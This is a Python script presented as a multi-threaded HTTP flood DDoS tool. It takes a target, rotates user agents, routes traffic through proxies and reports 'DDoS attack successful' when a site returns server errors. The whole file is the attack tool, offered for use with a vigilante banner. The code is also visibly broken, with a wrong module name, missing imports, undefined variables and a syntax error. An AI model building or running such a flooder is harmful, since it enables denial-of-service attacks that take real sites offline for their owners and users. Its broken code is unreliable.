import request
import time
import random
import sys
import threading

headers_useragents = []
R = '\033[31m' #Aggressive/Alert/Caution/Warning/Failed
B = '\033[34m' #Normal/Questioning/
G = '\033[1;32m' #Process Completed/Success/
Y = '\033[32m' #On Process/Processing/Executing/Deploying/

def dict_headers():
    global headers_useragents
    with open("useragents.txt", "r") as f:
        useragents = f.read().splitlines()
        for useragent in useragents:
            headers_useragents.append(useragent)

dict_headers()

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def intro():
    clear()
    message = f"""{B}

W E L C O M E   T O   H T T P F L O O D v . 2!

H A V E   F U N! (>_•)

    """
    for char in message:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(0.03)
    time.sleep(2)

clear()

intro()

clear()

print(f"""{B}


      ░▒▓████████▓▒░▒▓██████▓▒░▒▓████████▓▒░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░
      ░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░  ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░
      ░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░  ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░
      ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░  ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░
      ░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░  ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░
      ░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░  ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░
      ░▒▓████████▓▒░▒▓██████▓▒░  ░▒▓█▓▒░   ░▒▓██████▓▒░ ░▒▓█████████████▓▒░


{R}DDOS TOOLS OF EOTCW AND VULNSEC ARMY PH [HTTP-FLOOD METHOD V.2]
HTTPFLOOD VERSION2 MADE STRONGER WITH PROXIES AND MULTI-THREADING
WE HATE EVIL,WICKEDNESS,ABOMINATION,AND CRUELTY; WE HACK FOR GOD!
[!] WARNING: ONLY USE THIS TOOL AGAINST EVIL AND NOT FOR EVIL!!!
PRESS CTRL + C TO EXIT

""")

def attack(target, proxyfile):
    try:
        r = 0
        while True:
            r += 1
            headers = {'user-agent': random.choice(headers_useragents)}
            proxies = {'http': proxyfile,'https': proxyfile}
            req = request.get(target, headers=headers, proxies=proxies, verify=False)
            if req.status_code >= 500:
                print(f"{G}[+] Target Website is down! DDoS attack successful!")
                answer = input(f"{B}Do you want to continue the attack?(y/n) ")
                if answer.lower() == 'y':
                    try:
                        print(f"{Y}Continuing.....")
                        while True:
                            r += 1
                            headers = {'user-agent': random.choice(headers_useragents)}
                            proxies = {'http': proxyfile,'https': proxyfile}
                            req = request.get(target, headers=headers, proxies=proxies, verify=False)
                            if req.status_code >= 500:
                                print(f"{G}[+] Target Website is down! DDoS attack successful!")
                            elif response_status == 403:
                                print(f"{R}[!] DDoS attack bloked!!!")
                            elif response_status >= 200 and response_status < 500:
                                print(f"{Y}[*] Attacking https://example.com, Sending 10000 Request.")
                            else:
                                print(f"{R}Unexpected status code: {response.status}")

                    except requests.exceptions.HTTPError as errh:
                        print(f"{R}HTTP error: {errh}")
                    except requests.exceptions.ReadTimeout:
                        print(f"{R}Request timed out")
                    except requests.exceptions.ConnectionError:
                        print(f"{R}Connection error")
                    except Exception as e:
                        print(f"{R}Unexpected error: {e}")
                    except KeyboardInterrupt:
                        alert = f"{R}Exiting....."
                    for char in alert:
                        sys.stdout.write(char)
                        sys.stdout.flush()
                        time.sleep(0.05)
                    time.sleep(1)
                    exit()
                else:
                    print(f"{Y}Exiting.....")
                    time.sleep(2)
                    break
            elif response_status == 403:
                print(f"{R}[!] DDoS attack bloked!!!")
            elif response_status >= 200 and response_status < 500:
                print(f"{Y}[*] Attacking https://example.com, Sending 10000 Request.")
            else:
                print(f"{R}Unexpected status code: {response.status}")

    except requests.exceptions.HTTPError as errh:
        print(f"{R}HTTP error: {errh}")
    except requests.exceptions.ReadTimeout:
        print(f"{R}Request timed out")
    except requests.exceptions.ConnectionError:
        print(f"{R}Connection error")
    except Exception as e:
        print(f"{R}Unexpected error: {e}")
    except KeyboardInterrupt:
        alerttwo = f"{R}Exiting....."
        for char in alerttwo:
            sys.stdout.write(char)
            sys.stdout.flush()
            time.sleep(0.05)
        time.sleep(1)
        exit()

def main(target, proxyfile):
    startmsg = f"{Y}[+]Preparing to Attack....."
    for char in startmsg:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(0.05)
    time.sleep(1)
    attack(target, proxyfile)

if __name__ == "__main__":
    target = input(f"{B}Enter the target: ")
    num_threads = int(input(f"{B}Amount of threads(1-1000): ")
    proxyfile = input(f"{B}Enter the proxy file: ")
    if os.path.isfile(proxyfile):
        print(f"{G}[+]Success! proxy file is found!")
        main(target, proxyfile)
    else:
        print(f"{R}[!]ERROR: 404 file not found!!!")

    for i in range(num_threads):
        thread = threading.Thread(target=attack)
        thread.start()
